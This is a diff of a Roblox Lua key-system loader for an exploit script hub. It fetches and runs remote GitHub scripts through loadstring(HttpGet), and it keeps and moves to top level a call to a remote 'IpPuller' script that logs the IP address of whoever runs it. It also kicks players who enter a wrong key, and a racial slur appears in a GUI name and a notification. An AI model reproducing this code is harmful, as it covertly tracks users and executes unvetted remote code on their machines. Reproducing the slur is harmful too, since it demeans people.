@@ -8,7 +8,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndST
 if table.find(G_sussytable, game.Players.LocalPlayer.UserId) then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVeryTureCoon/TheGameHub/main/Hub",true))();
 else
-    local fishaok1151niggacode = Instance.new("ScreenGui")
+    local MainGui = Instance.new("ScreenGui")
     local keyfindsystems = Instance.new("Frame")
     local UICorner = Instance.new("UICorner")
     local BackGround = Instance.new("ImageLabel")
@@ -23,12 +23,12 @@ else
     
     --Properties:
     
-    fishaok1151niggacode.Name = "fishaok#1151niggacode"
-    fishaok1151niggacode.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    fishaok1151niggacode.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    MainGui.Name = "fishaok#1151niggacode"
+    MainGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    MainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     
     keyfindsystems.Name = "keyfindsystems"
-    keyfindsystems.Parent = fishaok1151niggacode
+    keyfindsystems.Parent = MainGui
     keyfindsystems.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
     keyfindsystems.BackgroundTransparency = 1.000
     keyfindsystems.Position = UDim2.new(0.179519519, 0, 0.141176477, 0)
@@ -107,43 +107,39 @@ else
     
     UICorner_5.Parent = Disocrd
     
-    -- Scripts:
-    
-    local function ZKBTT_fake_script() -- CheckYourMfKEY.KeySystem 
-    	local script = Instance.new('LocalScript', CheckYourMfKEY)
-    	local key = script.Parent.Parent.key
-    	
-    	script.Parent.MouseButton1Click:Connect(function()
-    		if key.Text == tostring(game:HttpGet("https://pastebin.com/raw/XXM0dDgP")) then
-    			script.Parent.Parent:TweenPosition(UDim2.new(0.583,0,-1.9,0), "Out", "Quad", 1, true)
-    			print"we loaded the gui you wanted master"
-    			game.Lighting.SuperWeed:Destroy()
-    			game.Workspace.BadassMusic:Destroy()
-    			loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVeryTureCoon/TheGameHub/main/Hub",true))();
-    			wait(5)
-    			script.Parent.Parent:Destroy() -- Destroys the GUI after a set time
-    	
-    		elseif -- Tweening | If you want it to do a different tween just change the "Quad" to another tween animation
-    			key.Text == "" then
-    			key.Text = "" else
-    			key.Text = "Incorrect, try again."
-    			wait(2)
-    			game.Players.LocalPlayer:Kick("Join discord to get key!")
-    			wait(1)
-    			key.Text = ""
-    		end
-    	end)
-    end
 end
 
-	local scriptt = Instance.new('LocalScript')
-	script.Parent = Disocrd
+    local key = script.Parent.Parent.key
+    	
+    CheckYourMfKEY.MouseButton1Click:Connect(function()
+    	if key.Text == tostring(game:HttpGet("https://pastebin.com/raw/XXM0dDgP")) then
+    		script.Parent.Parent:TweenPosition(UDim2.new(0.583,0,-1.9,0), "Out", "Quad", 1, true)
+    		print"we loaded the gui you wanted master"
+    		game.Lighting.SuperWeed:Destroy()
+    		game.Workspace.BadassMusic:Destroy()
+    		loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVeryTureCoon/TheGameHub/main/Hub",true))();
+    		wait(5)
+    		script.Parent.Parent:Destroy() -- Destroys the GUI after a set time
+    	
+    	elseif -- Tweening | If you want it to do a different tween just change the "Quad" to another tween animation
+    		key.Text == "" then
+    		key.Text = "" else
+    		key.Text = "Incorrect, try again."
+    		wait(2)
+    		game.Players.LocalPlayer:Kick("Join discord to get key!")
+    		wait(1)
+    		key.Text = ""
+    	end
+    end)    
 
-	scriptt.Parent.MouseButton1Click:Connect(function()
+
+	Disocrd.MouseButton1Click:Connect(function()
 		setclipboard("https://discord.gg/ja5g4ym7WB")
 		toclipboard("https://discord.gg/ja5g4ym7WB")
 		print"Copied"
 	end)
+	
+
 local function EZDNAOF_fake_script() -- keyfindsystems.Dragify 
 	local script = Instance.new('LocalScript', keyfindsystems)
 
@@ -186,44 +182,37 @@ local function EZDNAOF_fake_script() -- keyfindsystems.Dragify
 	dragify(script.Parent)
 end
 coroutine.wrap(EZDNAOF_fake_script)()
-local function BSRFG_fake_script() -- fishaoniggacode.Text 
-	local script = Instance.new('LocalScript', fishaoniggacode)
 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/TextNotfi"))()
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "KeySystem loaded successfully!"})
+    wait(2)
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "If you dont know the key join the discord server key changes daily or when i feel like it"})
+    wait(2)
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "Lol nigga code by fishaok#1151"})
 	print"loaded text"
-end
-coroutine.wrap(BSRFG_fake_script)()
-	local script = Instance.new('LocalScript', fishaoniggacode)
 
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/blurr"))()
 	print"COOL BLURR LOADED"
 
-local function OHWD_fake_script() -- fishaoniggacode.ChangeText 
-	local script = Instance.new('LocalScript', fishaoniggacode)
+
+local function OHWD_fake_script() -- fishaoniggacode.ChangeText
 
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/ChangeText"))()
 	print"Loaded change text"
 end
+
 coroutine.wrap(OHWD_fake_script)()
-local function DUUUWLP_fake_script() -- fishaoniggacode.BadAssMusic 
-	local script = Instance.new('LocalScript', fishaoniggacode)
 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/coolMusic"))()
-	print"LOADED MUSIC"
-end
-coroutine.wrap(DUUUWLP_fake_script)()
-local function BODU_fake_script() -- fishaoniggacode.IPLOGGER 
-	local script = Instance.new('LocalScript', fishaoniggacode)
+local fishbadassmusic = Instance.new("Sound")
+fishbadassmusic.SoundId = "rbxassetid://1271288928"
+fishbadassmusic.Playing = true
+fishbadassmusic.Looped = true
+fishbadassmusic.TimePosition = "9"
+fishbadassmusic.Name = "BadassMusic"
+fishbadassmusic.Parent = game.Workspace
 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/IpPuller"))()
-	print" we pulled your ip loaded ip puller"
-end
-coroutine.wrap(BODU_fake_script)()
-local function CKOAJB_fake_script() -- fishaoniggacode.Later usde check 
-	local script = Instance.new('LocalScript', fishaoniggacode)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/IpPuller"))()
+print" we pulled your ip loaded ip puller"
 
-	local SuperWheat = Instance.new("BoolValue")
-	SuperWheat.Name = "ncca"
-	SuperWheat.Parent = game.Players.LocalPlayer
-end
-coroutine.wrap(CKOAJB_fake_script)()
+local SuperWheat = Instance.new("BoolValue")
+SuperWheat.Name = "ncca"
+SuperWheat.Parent = game.Players.LocalPlayer
